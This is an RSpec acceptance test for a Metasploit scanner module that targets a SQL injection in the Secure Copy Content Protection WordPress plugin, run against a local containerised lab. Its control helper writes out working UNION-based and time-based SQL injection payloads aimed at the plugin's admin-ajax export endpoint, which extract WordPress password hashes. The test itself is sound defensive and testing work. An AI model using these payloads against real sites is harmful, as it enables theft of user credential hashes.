require 'acceptance_spec_helper'
require 'base64'
require 'digest'
require 'json'
require 'net/http'
require 'open3'
require 'socket'
require 'uri'

RSpec.describe 'Secure Copy Content Protection genuine SQLi targets', acceptance: true, order: :defined do
  include_context 'module target'

  before(:all) do
    @sc = { commands: [], requests: [], calls: [], reports: [], controls: [] }
    @release = ENV.fetch('SECURE_COPY_RELEASE', '2.8.1')
    @mode = ENV.fetch('SECURE_COPY_MODE', 'enabled')
    @prefix = ENV.fetch('SECURE_COPY_PREFIX', '')
    @count = Integer(ENV.fetch('SECURE_COPY_USER_COUNT', '1'))
    @vulnerable = @mode == 'enabled' && @release == '2.8.1'
    @base_workspace = "secure_copy_target_#{Process.pid}"
    begin
      catalog = JSON.parse(File.read('test/module_targets/secure_copy/releases.json')).fetch(@release)
      @baseline = sc_identity('installed')
      expect(@baseline.values_at('core', 'php', 'uid', 'database', 'database_role')).to eq(['6.8.3', '8.3.28', 33, 'wp_root', 'module_target@%'])
      expect(@baseline.fetch('server')).to start_with('11.2.2-MariaDB')
      expect(@baseline.fetch('database_grants').join("\n")).not_to include('ALL PRIVILEGES ON *.*', 'GRANT OPTION')
      installed = @mode != 'absent'
      active = @mode == 'enabled'
      expect(@baseline.values_at('installed', 'active', 'plugin_version')).to eq([installed, active, installed ? @release : nil])
      expect(@baseline.fetch('installed_sha256')).to eq(installed ? catalog.fetch('installed_sha256') : {})
      expect(@baseline.fetch('archive_sha256')).to eq(catalog.fetch('sha256'))
      expect(@baseline.fetch('active_plugins')).to eq(active ? ['secure-copy-content-protection/secure-copy-content-protection.php'] : [])
      expect(@baseline.fetch('registered_export')).to be(active)
      expect(['', '0']).to include(@baseline.fetch('allow_url_fopen'))
      expect(@baseline.values_at('prefix', 'table_prefix')).to eq([@prefix, ENV.fetch('SECURE_COPY_TABLE_PREFIX', 'wp_')])
      expect(@baseline.fetch('users').map { |row| row.fetch('user_login') }).to eq(%w[module_admin module_author module_subscriber module_editor])
      expect(@baseline.values_at('db_error', 'bootstrap_output_base64')).to eq(['', ''])
      if active
        expect(@baseline.fetch('native_tables').keys.sort).to eq(%w[ays_sccp ays_sccp_block_content ays_sccp_block_subscribe ays_sccp_reports ays_sccp_settings])
        expect(@baseline.dig('native_tables', 'ays_sccp_reports', 'rows')).to eq([])
        expect(@baseline.dig('native_tables', 'ays_sccp_block_subscribe', 'rows').length).to eq(1)
      else
        expect(@baseline.fetch('native_tables')).to eq({})
      end
      sc_subscribe if ENV['SECURE_COPY_REPORTS'] == '1'
      @baseline = sc_identity('before')
      sc_controls('before')
      expect(sc_sql("SELECT count(*) FROM information_schema.tables WHERE table_schema='public'").strip).to eq('0')
      expect(sc_sql('SELECT usesuper FROM pg_user WHERE usename=current_user').strip).to eq('f')
      endpoint = target_endpoint('reporting_db')
      expect(console_command("db_connect module_framework:module-target-framework-db-password@#{endpoint.fetch('host')}:#{endpoint.fetch('port')}/module_targets", timeout: 120)).not_to match(/\[-\]|Error|Exception/)
      expect(console_command('db_status')).to include('Connected to module_targets')
      sc_workspace(@base_workspace)
      expect(sc_reports.fetch('credentials')).to eq([])
      output = console_command("irb -e 'puts \"SECURE_COPY_PROVENANCE=\" + {ruby: RUBY_VERSION, config: Msf::Config.config_directory, owner_sha256: Digest::SHA256.file(\"modules/#{sc_fullname}.rb\").hexdigest}.to_json'")
      @sc[:provenance] = JSON.parse(output.match(/^SECURE_COPY_PROVENANCE=(.+)$/)[1])
      expect(@sc.fetch(:provenance).fetch('config')).to eq(ENV.fetch('MSF_CFGROOT_CONFIG'))
      expect(@sc.fetch(:provenance).fetch('owner_sha256')).to eq(Digest::SHA256.file("modules/#{sc_fullname}.rb").hexdigest)
      @sc[:preflight] = 'passed'
    ensure
      sc_save
    end
  end

  after(:all) do
    if @sc&.key?(:preflight)
      sc_controls('after')
      expect(sc_identity('after')).to eq(@baseline)
      expect(console_command('irb -e \'puts "SECURE_COPY_STATE=" + {sessions: framework.sessions.keys, jobs: framework.jobs.keys}.to_json\'')).to include('SECURE_COPY_STATE={"sessions":[],"jobs":[]}')
      expect(Dir.glob(File.join(ENV.fetch('MSF_CFGROOT_CONFIG'), 'loot', '*'))).to eq([])
    end
  ensure
    @closed_socket&.close
    sc_save
  end

  it 'checks the actual public passive version result' do
    expected = if @mode == 'absent'
                 :unknown
               elsif @release == '2.8.2'
                 :safe
               else
                 :appears
               end
    sc_call('passive-check', 'check', {}, expected: expected)
  end

  Integer(ENV.fetch('SECURE_COPY_REPEATS', '1')).times do |iteration|
    it "verifies complete data or refusal on public run #{iteration + 1}" do
      sc_call("normal-#{iteration + 1}", 'run', {}, expected: @vulnerable ? :credentials : :refusal)
    end
  end

  if ENV['SECURE_COPY_FORCE_FIXED'] == '1'
    it 'refuses the same extraction on fixed source with AutoCheck disabled' do
      sc_workspace(@base_workspace + '_forced')
      sc_call('fixed-no-autocheck', 'run', { 'AutoCheck' => false }, expected: :refusal)
    end
  end

  if ENV['SECURE_COPY_CLOSED_PORT'] == '1'
    it 'checks a reserved non-listening loopback port without a finding' do
      @closed_socket = Socket.new(:INET, :STREAM, 0)
      @closed_socket.bind(Socket.sockaddr_in(0, '127.0.0.1'))
      sc_workspace(@base_workspace + '_closed')
      sc_call('closed-check', 'check', { 'RPORT' => @closed_socket.local_address.ip_port, 'HttpClientTimeout' => 3 }, expected: :safe)
    ensure
      @closed_socket&.close
    end

    it 'refuses a run on a reserved non-listening loopback port' do
      socket = Socket.new(:INET, :STREAM, 0)
      socket.bind(Socket.sockaddr_in(0, '127.0.0.1'))
      sc_workspace(@base_workspace + '_closed')
      sc_call('closed-run', 'run', { 'RPORT' => socket.local_address.ip_port, 'HttpClientTimeout' => 3 }, expected: :refusal)
    ensure
      socket&.close
    end
  end

  def sc_fullname
    'auxiliary/scanner/http/wp_secure_copy_content_protection_sqli'
  end

  def sc_call(label, action, overrides, expected:)
    sc_workspace(@base_workspace) unless label.start_with?('closed-', 'fixed-no-')
    options = { 'TARGETURI' => @prefix + '/', 'VHOST' => 'module-target.test', 'SqliDelay' => 0.6, 'HttpClientTimeout' => 5, 'USER_COUNT' => @count, 'THREADS' => 1, 'VERBOSE' => true }.merge(overrides)
    previous = sc_reports.fetch('credentials')
    call = { label: label, action: action, options: options, expected: expected, workspace: @workspace, state: 'started' }
    @sc.fetch(:calls) << call
    sc_save
    started = Process.clock_gettime(Process::CLOCK_MONOTONIC)
    output = run_target_module(sc_fullname, 'app', options, action: action, allow_errors: true, command_timeout: 900)
    call.merge!(state: 'returned', seconds: Process.clock_gettime(Process::CLOCK_MONOTONIC) - started, output_base64: Base64.strict_encode64(output.b))
    sc_save
    rows = sc_reports.fetch('credentials')
    expect(output).not_to match(/Unknown datastore option|Auxiliary failed|Exception|NoMethodError/)
    case expected
    when :appears
      expect(output).to include('The target appears to be vulnerable.')
      expect(output).not_to include('The target is vulnerable.')
    when :safe
      expect(output).to include('The target is not exploitable.')
    when :unknown
      expect(output).to include('Cannot reliably check exploitability.')
    when :credentials
      expect(output).not_to include('Auxiliary aborted', 'Testing of SQLi failed', 'Connection failed')
      expect(output).to include('Enumerating Usernames and Password Hashes', 'Dumped table contents:')
      expect(rows.length).to eq(@count)
      expect(rows.map { |row| row.fetch('username') }.uniq.length).to eq(@count)
      native = @baseline.fetch('users').to_h { |row| row.values_at('user_login', 'user_pass') }
      rows.each do |row|
        expect(native).to have_key(row.fetch('username'))
        expect(row.fetch('private_data')).to eq(native.fetch(row.fetch('username')))
        endpoint = target_endpoint('app')
        expect(row.values_at('private_type', 'origin_type', 'module_full_name', 'address', 'port', 'proto')).to eq(['Metasploit::Credential::NonreplayableHash', 'Metasploit::Credential::Origin::Service', sc_fullname, endpoint.fetch('host'), endpoint.fetch('port'), 'tcp'])
        expect(row.fetch('service')).to match(/\Awordpress\z/i)
      end
      expect(rows).to eq(previous) unless previous.empty?
    when :refusal
      expect(output).not_to include('Dumped table contents:')
      expect(output).to match(/Testing of SQLi failed|Auxiliary aborted due to failure/)
      expect(rows).to eq([])
    end
    sc_save
  ensure
    call[:console_base64] = Base64.strict_encode64(console.all_data.b) if call
    sc_save
  end

  def sc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-secure-copy.json'), JSON.pretty_generate(@sc)) if @sc
  end

  def sc_command(label, role, *arguments, user: nil)
    argv = target_runtime.fetch('compose') + ['exec', '-T']
    argv += ['--user', user] if user
    argv += [role, 'timeout', '30', *arguments]
    output, error, status = Open3.capture3(*argv)
    @sc.fetch(:commands) << { label: label, argv: argv, stdout_base64: Base64.strict_encode64(output), stderr: error, exit: status.exitstatus }
    sc_save
    raise "Secure Copy target command failed: #{label}: #{error}" unless status.success?

    output
  end

  def sc_identity(label)
    JSON.parse(sc_command(label, 'app', 'php', '/opt/module-target/control.php', user: 'www-data'))
  end

  def sc_http(label, path, fields: nil)
    request = fields ? Net::HTTP::Post.new(path) : Net::HTTP::Get.new(path)
    request.set_form_data(fields) if fields
    request['Host'] = 'module-target.test'
    endpoint = target_endpoint('app')
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 5
    http.read_timeout = 10
    http.max_retries = 0
    started = Process.clock_gettime(Process::CLOCK_MONOTONIC)
    response = http.request(request)
    @sc.fetch(:requests) << { label: label, path: path, fields: fields, code: response.code, headers: response.to_hash, body_base64: Base64.strict_encode64(response.body.to_s.b), seconds: Process.clock_gettime(Process::CLOCK_MONOTONIC) - started }
    sc_save
    response
  end

  def sc_subscribe
    expect(@mode).to eq('enabled')
    response = sc_http('native-subscription-form', @prefix + '/module-target-post/')
    expect(response.code).to eq('200')
    expect(response.body).to include('name="ays_sb_email_form_1"')
    response = sc_http('native-subscription-submit', @prefix + '/module-target-post/', fields: { 'subscribe_sub_1' => 'Subscribe', 'ays_sb_email_form_1' => 'module-probe@example.test' })
    expect(response.code).to eq('200')
    expect(response.body).to include('MODULE_NATIVE_SUBSCRIPTION_CONTENT')
    reports = sc_identity('after-native-form').dig('native_tables', 'ays_sccp_reports', 'rows')
    expect(reports.length).to eq(1)
    expect(reports.first.fetch('subscribe_email')).to eq('module-probe@example.test')
  end

  def sc_export(label, payload)
    query = URI.encode_www_form('action' => 'ays_sccp_results_export_file', 'sccp_id[]' => payload, 'type' => 'json')
    sc_http(label, @prefix + '/wp-admin/admin-ajax.php?' + query, fields: {})
  end

  def sc_controls(phase)
    response = sc_http(phase + '-login', @prefix + '/wp-login.php')
    expect(response.code).to eq('200')
    expect(response.body).to include('name="log"', 'name="pwd"')
    response = sc_export(phase + '-ordinary', '1')
    expect(response.code).to eq(@mode == 'enabled' ? '200' : '400')
    if @vulnerable
      data = JSON.parse(response.body)
      expect(data.fetch('status')).to be(true)
      expect(data.fetch('data').length).to eq(@baseline.dig('native_tables', 'ays_sccp_reports', 'rows').length)
    end
    prefix = @baseline.fetch('table_prefix')
    expect(prefix).to match(/\A[a-z_]+\z/)
    marker = "Native#{phase}SecureCopyMarker"
    observed = {}
    [false, true].each do |truth|
      payload = '-1) UNION ALL SELECT 812,CONCAT(0x' + marker.unpack1('H*') + ",(SELECT user_pass FROM #{prefix}users ORDER BY ID LIMIT 1)),0x3132372e302e302e31,NOW(),0,0x4e6174697665 FROM (SELECT NOW() AS vote_date)native_row WHERE (812=" + (truth ? '812' : '813')
      response = sc_export(phase + '-union-' + truth.to_s, payload)
      expect(response.code).to eq(@mode == 'enabled' ? '200' : '400')
      expected = marker + @baseline.fetch('users').first.fetch('user_pass')
      observed[truth] = response.body.gsub('\/', '/').include?(expected)
      expect(observed[truth]).to be(@vulnerable && truth)
    end
    timings = {}
    [false, true].each do |truth|
      payload = '987654321) AND (SELECT 8123 FROM (SELECT IF(812=' + (truth ? '812' : '813') + ',SLEEP(0.6),0))native_gate)-- '
      response = sc_export(phase + '-timing-' + truth.to_s, payload)
      expect(response.code).to eq(@mode == 'enabled' ? '200' : '400')
      timings[truth] = @sc.fetch(:requests).last.fetch(:seconds)
    end
    expect(timings.fetch(true) - timings.fetch(false)).to be >= 0.45 if @vulnerable
    %w[app db reporting_db].each do |role|
      %w[memory.events pids.events].each do |key|
        text = sc_command(phase + role + key, role, 'cat', '/sys/fs/cgroup/' + key)
        values = text.lines.to_h do |line|
          name, value = line.split
          [name, Integer(value)]
        end
        expect(values.values_at('oom', 'oom_kill')).to eq([0, 0]) if key == 'memory.events'
        expect(values.fetch('max')).to eq(0) if key == 'pids.events'
      end
    end
    @sc.fetch(:controls) << { phase: phase, observed_markers: observed, timing_seconds: timings, status: 'passed' }
    sc_save
  end

  def sc_workspace(name)
    @workspace = name
    expect(@workspace).to match(/\Asecure_copy_target_[0-9]+(?:_closed|_forced)?\z/)
    expect(console_command("workspace -a #{@workspace}")).to include(@workspace)
  end

  def sc_sql(query)
    sc_command('sql', 'reporting_db', 'env', 'PGPASSWORD=module-target-framework-db-password', 'psql', '-h', '127.0.0.1', '-U', 'module_framework', '-d', 'module_targets', '-v', 'ON_ERROR_STOP=1', '-Atc', query)
  end

  def sc_reports
    raise 'Invalid Secure Copy workspace' unless @workspace.match?(/\Asecure_copy_target_[0-9]+(?:_closed|_forced)?\z/)

    credentials = JSON.parse(sc_sql(<<~SQL))
      SELECT coalesce(json_agg(row ORDER BY row.id),'[]'::json) FROM (
        SELECT c.id,p.username,secret.data AS private_data,secret.type AS private_type,secret.jtr_format,c.origin_type,
          o.module_full_name,s.id AS service_id,s.port,s.proto,s.name AS service,host(h.address::inet) AS address
        FROM metasploit_credential_cores c JOIN workspaces w ON w.id=c.workspace_id
        LEFT JOIN metasploit_credential_publics p ON p.id=c.public_id
        LEFT JOIN metasploit_credential_privates secret ON secret.id=c.private_id
        LEFT JOIN metasploit_credential_origin_services o ON o.id=c.origin_id AND c.origin_type='Metasploit::Credential::Origin::Service'
        LEFT JOIN services s ON s.id=o.service_id LEFT JOIN hosts h ON h.id=s.host_id WHERE w.name='#{@workspace}'
      ) row
    SQL
    vulns = JSON.parse(sc_sql(<<~SQL))
      SELECT coalesce(json_agg(row ORDER BY row.id),'[]'::json) FROM (
        SELECT v.id,v.name,v.info FROM vulns v JOIN hosts h ON h.id=v.host_id JOIN workspaces w ON w.id=h.workspace_id
        WHERE w.name='#{@workspace}'
      ) row
    SQL
    result = { 'credentials' => credentials, 'vulns' => vulns }
    @sc.fetch(:reports) << { workspace: @workspace, **result }
    sc_save
    result
  end
end
